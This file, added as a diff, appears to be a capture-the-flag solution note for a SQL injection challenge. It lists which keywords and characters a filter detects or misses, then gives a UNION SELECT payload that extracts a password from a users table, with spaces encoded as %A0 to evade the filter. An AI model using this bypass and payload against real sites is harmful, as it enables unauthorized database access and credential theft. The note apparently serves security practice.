@@ -1,0 +1,48 @@
+Enumerate filtered chars:
+/?action=users&param=1abcd
+----> Result not found
+/?action=users&param=1union
+----> Attack dettected
+
+detect as attack
+================
+, ("
+and
+or
+space
+select
+union
+password
+order et ORDER
+substr et SUBSTR
+substring et SUBSTRING
+where et WHERE
+mid et MID
+
+not detected
+============
+?
+!
+-
+#
+--
+SELECT
+UNION
+3-1)(
+users
+membres
+username
+pass
+group
+length
+left
+reverse
+space (the word)
+insert
+
+
+Payload: 
+param=-1337 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT password FROM users Limit 1)b JOIN (SELECT 3)c JOIN (SELECT 4)d
+
+Solution:
+param=-1337%A0UNION%A0SELECT%A0*%A0FROM%A0(SELECT%A01)a%A0JOIN%A0(SELECT%A0password%A0FROM%A0users%A0Limit%A01)b%A0JOIN%A0(SELECT%A03)c%A0JOIN%A0(SELECT%A04)d
